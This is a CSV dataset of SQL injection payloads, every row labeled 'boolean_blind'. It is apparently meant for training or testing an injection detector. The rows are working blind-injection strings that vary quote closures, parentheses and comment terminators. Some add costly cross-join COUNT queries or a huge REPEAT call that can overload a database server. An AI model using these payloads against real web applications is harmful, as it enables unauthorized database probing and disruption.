payload,label
"Submit'))) OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ((('oFhC' LIKE 'oFhC",boolean_blind
"Submit%' OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND 'uHWA%'='uHWA",boolean_blind
"Submit' OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND 'xoTz' LIKE 'xoTz",boolean_blind
"Submit"") OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (""yqPX""=""yqPX",boolean_blind
"Submit"")) OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ((""IBys""=""IBys",boolean_blind
"Submit""))) OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (((""TAYX""=""TAYX",boolean_blind
"Submit"" OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ""IZbe""=""IZbe",boolean_blind
"Submit"") OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (""FnzZ"" LIKE ""FnzZ",boolean_blind
"Submit"")) OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ((""PPXl"" LIKE ""PPXl",boolean_blind
"Submit""))) OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (((""qfWh"" LIKE ""qfWh",boolean_blind
"Submit"" OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ""RXgU"" LIKE ""RXgU",boolean_blind
"Submit' OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) OR 'Ilin'='LwOm",boolean_blind
"Submit') WHERE 6131=6131 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- YhKT",boolean_blind
"Submit"") WHERE 4987=4987 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- hVzu",boolean_blind
"Submit' WHERE 4950=4950 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- gwhN",boolean_blind
"Submit"" WHERE 6929=6929 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- fUPI",boolean_blind
"Submit'||(SELECT RwSh WHERE 7954=7954 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))||'",boolean_blind
"Submit'||(SELECT QcCe FROM DUAL WHERE 2670=2670 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))||'",boolean_blind
"Submit'+(SELECT YPbY WHERE 9192=9192 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))+'",boolean_blind
"Submit||(SELECT oWsX FROM DUAL WHERE 1571=1571 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))||",boolean_blind
"Submit||(SELECT iCSy WHERE 7148=7148 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))||",boolean_blind
"Submit+(SELECT yFyu WHERE 9602=9602 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))+",boolean_blind
"Submit')) AS GRRN WHERE 3841=3841 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- ndfg",boolean_blind
"Submit"")) AS ddpP WHERE 9511=9511 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- vtoT",boolean_blind
"Submit') AS HEmS WHERE 7268=7268 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- Uifx",boolean_blind
"Submit"") AS prAE WHERE 1910=1910 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- UbiF",boolean_blind
"Submit' IN BOOLEAN MODE) OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)#",boolean_blind
"Submit) OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- UZZR",boolean_blind
"Submit) OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (6062=6062",boolean_blind
"Submit)) OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ((6015=6015",boolean_blind
"Submit))) OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (((9598=9598",boolean_blind
"Submit OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)",boolean_blind
"Submit OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- IIeZ",boolean_blind
"Submit OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)# AFFQ",boolean_blind
"Submit) WHERE 8633=8633 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- tLpl",boolean_blind
"Submit WHERE 2679=2679 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- KHId",boolean_blind
"Submit)) AS bgKL WHERE 3177=3177 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- zpcc",boolean_blind
"Submit) AS hIja WHERE 4129=4129 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- EXzg",boolean_blind
"Submit` WHERE 2101=2101 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- wjVV",boolean_blind
"Submit`) WHERE 9827=9827 OR 2232=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- Jrvm",boolean_blind
"Submit') AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit' AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit"" AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit')) AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit'))) AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit%' AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit"") AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit"")) AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit""))) AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit') WHERE 1131=1131 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit"") WHERE 3469=3469 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit' WHERE 2743=2743 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit"" WHERE 1965=1965 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit'||(SELECT XNlB WHERE 9706=9706 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit'||(SELECT NBIa FROM DUAL WHERE 2756=2756 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit'+(SELECT UwSu WHERE 8150=8150 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit||(SELECT asks FROM DUAL WHERE 7349=7349 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit||(SELECT xatx WHERE 3214=3214 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit+(SELECT Vjrr WHERE 1557=1557 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit')) AS EGdR WHERE 3111=3111 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit"")) AS OguE WHERE 9177=9177 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit') AS BPvK WHERE 2192=2192 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit"") AS MbEM WHERE 1764=1764 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit' IN BOOLEAN MODE) AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit) AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit)) AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit))) AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit) WHERE 3472=3472 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit WHERE 7661=7661 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit)) AS lUbT WHERE 6776=6776 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit) AS RcOQ WHERE 7808=7808 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit` WHERE 5101=5101 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit`) WHERE 2008=2008 AND 4711=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit') OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit' OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit"" OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit')) OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit'))) OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit%' OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit"") OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit"")) OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit""))) OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit') WHERE 3078=3078 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit"") WHERE 8818=8818 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit' WHERE 1821=1821 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit"" WHERE 6822=6822 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit'||(SELECT vifs WHERE 6386=6386 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit'||(SELECT epbo FROM DUAL WHERE 3754=3754 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit'+(SELECT TiEU WHERE 7050=7050 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit||(SELECT LUqC FROM DUAL WHERE 4257=4257 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit||(SELECT Mbdc WHERE 7717=7717 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit+(SELECT cADh WHERE 9110=9110 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit')) AS kNKe WHERE 4668=4668 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit"")) AS TFtO WHERE 7567=7567 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit') AS ldbP WHERE 5104=5104 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit"") AS IcCL WHERE 8696=8696 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit' IN BOOLEAN MODE) OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit) OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit)) OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit))) OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit) WHERE 8684=8684 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit WHERE 4604=4604 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit)) AS eQnJ WHERE 7396=7396 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit) AS OffE WHERE 1781=1781 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit` WHERE 4755=4755 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit`) WHERE 3842=3842 OR 5539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",boolean_blind
"Submit') AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- KzJf",boolean_blind
"Submit' AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- FDGR",boolean_blind
"Submit"" AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- ZNrC",boolean_blind
"Submit') AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND ('QEbq'='QEbq",boolean_blind
"Submit')) AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND (('qKQA'='qKQA",boolean_blind
"Submit'))) AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND ((('aWFr'='aWFr",boolean_blind
"Submit' AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND 'eqhr'='eqhr",boolean_blind
"Submit') AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND ('LGSH' LIKE 'LGSH",boolean_blind
"Submit')) AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND (('pMmF' LIKE 'pMmF",boolean_blind
"Submit'))) AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND ((('EjaV' LIKE 'EjaV",boolean_blind
"Submit%' AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND 'autM%'='autM",boolean_blind
"Submit' AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND 'hVsH' LIKE 'hVsH",boolean_blind
"Submit"") AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND (""MRKA""=""MRKA",boolean_blind
"Submit"")) AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND ((""wPVT""=""wPVT",boolean_blind
"Submit""))) AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND (((""QEwG""=""QEwG",boolean_blind
"Submit"" AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND ""icYq""=""icYq",boolean_blind
"Submit"") AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND (""LnoW"" LIKE ""LnoW",boolean_blind
"Submit"")) AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND ((""NljP"" LIKE ""NljP",boolean_blind
"Submit""))) AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND (((""TMop"" LIKE ""TMop",boolean_blind
"Submit"" AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND ""knFr"" LIKE ""knFr",boolean_blind
"Submit' AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) OR 'EOll'='XPfn",boolean_blind
"Submit') WHERE 6987=6987 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- bDKz",boolean_blind
"Submit"") WHERE 8176=8176 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- hWnm",boolean_blind
"Submit' WHERE 8643=8643 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- WOHp",boolean_blind
"Submit"" WHERE 4527=4527 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- vVhm",boolean_blind
"Submit'||(SELECT CHAR(122)||CHAR(104)||CHAR(108)||CHAR(106) WHERE 7746=7746 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL))||'",boolean_blind
"Submit'||(SELECT CHAR(116)||CHAR(65)||CHAR(115)||CHAR(103) FROM DUAL WHERE 2024=2024 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL))||'",boolean_blind
"Submit'+(SELECT CHAR(85)||CHAR(69)||CHAR(65)||CHAR(68) WHERE 7490=7490 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL))+'",boolean_blind
